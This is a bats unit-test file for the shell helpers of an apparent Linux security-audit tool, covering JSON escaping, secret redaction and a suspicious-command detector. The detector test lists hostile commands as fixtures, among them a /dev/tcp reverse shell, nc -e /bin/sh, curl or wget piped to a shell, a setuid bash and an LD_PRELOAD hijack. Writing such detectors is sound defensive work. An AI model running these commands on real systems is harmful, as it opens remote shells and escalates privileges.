#!/usr/bin/env bats
# Unit tests for linux/lib/common.sh helpers.

load test_helper

setup() {
  # shellcheck source=../../linux/lib/common.sh
  source "${REPO_ROOT}/linux/lib/common.sh"
}

@test "sourcing common.sh twice is idempotent" {
  run bash -c "source '${REPO_ROOT}/linux/lib/common.sh'; source '${REPO_ROOT}/linux/lib/common.sh'; echo ok"
  [ "${status}" -eq 0 ]
  [ "${output}" = "ok" ]
}

@test "bo_json_str escapes quotes, backslashes, newlines and control bytes" {
  run bo_json_str $'a"b\\c\nd\te\x01f'
  [ "${status}" -eq 0 ]
  [ "${output}" = '"a\"b\\c\nd\te\u0001f"' ]
  python3 -c 'import json,sys; json.loads(sys.argv[1])' "${output}"
}

@test "bo_json_str replaces non-ASCII bytes so output is always valid JSON" {
  run bo_json_str $'caf\xc3\xa9 \xff'
  python3 -c 'import json,sys; json.loads(sys.argv[1])' "${output}"
}

@test "bo_redact hides password, token and secret values" {
  run bash -c "source '${REPO_ROOT}/linux/lib/common.sh'; printf '%s\n' 'run --password hunter2 PASSWORD=abc token: xyz API_KEY=k1 --api-key=zz ok' | bo_redact"
  [[ "${output}" != *hunter2* ]]
  [[ "${output}" != *abc* ]]
  [[ "${output}" != *xyz* ]]
  [[ "${output}" != *k1* ]]
  [[ "${output}" != *zz* ]]
  [[ "${output}" == *"<redacted>"* ]]
  [[ "${output}" == *ok* ]]
}

@test "bo_suspicious_reasons flags known-bad patterns" {
  local line
  for line in \
    'bash -i >& /dev/tcp/1.2.3.4/4444 0>&1' \
    'nc -e /bin/sh 1.2.3.4 9' \
    'curl http://x/y.sh | sh' \
    'wget -qO- http://x | bash' \
    'echo aGk= | base64 -d | sh' \
    'python3 -c "import socket;s=socket.socket()"' \
    '/tmp/.x/agent --daemon' \
    'chmod u+s /bin/bash' \
    'bash /tmp/x.sh' \
    'rm /tmp/a; /tmp/.x/agent' \
    'bash /tmp/.X11-unix/payload.sh' \
    '/tmp/.X11-unixx/agent' \
    '/tmp/.X11-unix/sub/agent' \
    'bash -e /tmp/.X11-unix/X0' \
    'ExecStart=/tmp/.X11-unix/X0' \
    '*/5 * * * * root /tmp/.X11-unix/X0' \
    'find / -name x -exec sh /tmp/p.sh \;' \
    'cp /tmp/evil /usr/bin/x' \
    "alias sudo='/tmp/steal'" \
    'export LD_PRELOAD=/lib/x.so'; do
    run bo_suspicious_reasons "${line}"
    [ -n "${output}" ] || {
      echo "not flagged: ${line}"
      return 1
    }
  done
}

@test "bo_suspicious_reasons stays quiet on ordinary commands" {
  local line
  for line in \
    '/usr/sbin/sshd -D' \
    '17 * * * * root cd / && run-parts /etc/cron.hourly' \
    'ExecStart=/usr/bin/python3 /usr/lib/app/main.py' \
    'curl -fsSL https://example.test/file -o /var/lib/app/file' \
    'nc -z localhost 22' \
    '0 3 * * * root find /tmp -type f -mtime +7 -delete' \
    '*/10 * * * * root rm -rf /tmp/cache/* /tmp/old' \
    '@daily root /usr/sbin/tmpreaper 7d /tmp/' \
    '[ -S /tmp/.X11-unix/X0 ] && export DISPLAY=:0' \
    'export ICEAUTHORITY=/tmp/.ICE-unix/1234' \
    'mkdir -p /tmp/.X11-unix && chmod 1777 /tmp/.X11-unix' \
    'if [ ! -d /tmp/.font-unix ]; then x; fi'; do
    run bo_suspicious_reasons "${line}"
    [ -z "${output}" ] || {
      echo "false positive: ${line} -> ${output}"
      return 1
    }
  done
}

@test "bo_mode_has tests octal permission bits" {
  bo_mode_has 666 002
  bo_mode_has 644 022 && return 1 || true
  bo_mode_has 664 020
  refute bo_mode_has 640 007
  refute bo_mode_has notoctal 002
}

@test "bo_path and bo_unroot round-trip with and without BO_ROOT" {
  BO_ROOT="" run bo_path /etc/passwd
  [ "${output}" = "/etc/passwd" ]
  BO_ROOT="/fx/" run bo_path /etc/passwd
  [ "${output}" = "/fx/etc/passwd" ]
  BO_ROOT="/fx" run bo_unroot /fx/etc/passwd
  [ "${output}" = "/etc/passwd" ]
}

@test "bo_have honours BO_FORCE_MISSING_TOOLS" {
  bo_have ls
  BO_FORCE_MISSING_TOOLS="ls cat" run bo_have ls
  [ "${status}" -ne 0 ]
}
